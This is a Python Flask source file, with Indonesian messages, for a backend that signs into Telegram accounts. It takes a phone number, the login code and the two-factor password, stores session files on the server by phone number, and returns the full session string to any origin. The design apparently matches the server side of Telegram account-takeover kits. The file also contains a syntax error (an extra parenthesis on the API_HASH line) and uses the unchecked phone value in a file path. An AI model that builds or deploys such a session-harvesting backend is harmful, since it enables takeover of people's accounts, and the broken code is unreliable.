from flask import Flask, request, jsonify
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
from flask_cors import CORS
import os
from dotenv import load_dotenv

load_dotenv()
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH"))
SESSION_DIR = "session"
os.makedirs(SESSION_DIR, exist_ok=True)

app = Flask(__name__)
CORS(app)

@app.route("/")
def home():
    return "Telegram Login Backend Aktif"

@app.route("/send_code", methods=["POST"])
def send_code():
    phone = request.json.get("phone")
    if not phone:
        return jsonify({"error": "Nomor kosong"}), 400
    client = TelegramClient(f"{SESSION_DIR}/{phone}", API_ID, API_HASH)
    try:
        client.connect()
        client.send_code_request(phone)
        return jsonify({"status": "code_sent"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500
    finally:
        client.disconnect()

@app.route("/verify_code", methods=["POST"])
def verify_code():
    data = request.json
    client = TelegramClient(f"{SESSION_DIR}/{data.get('phone')}", API_ID, API_HASH)
    try:
        client.connect()
        client.sign_in(phone=data["phone"], code=data["code"])
        session = StringSession.save(client.session)
        return jsonify({"status": "logged_in", "session": session}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500
    finally:
        client.disconnect()

@app.route("/verify_password", methods=["POST"])
def verify_password():
    data = request.json
    client = TelegramClient(f"{SESSION_DIR}/{data.get('phone')}", API_ID, API_HASH)
    try:
        client.connect()
        client.sign_in(password=data["password"])
        session = StringSession.save(client.session)
        return jsonify({"status": "logged_in", "session": session}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500
    finally:
        client.disconnect()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8000)))
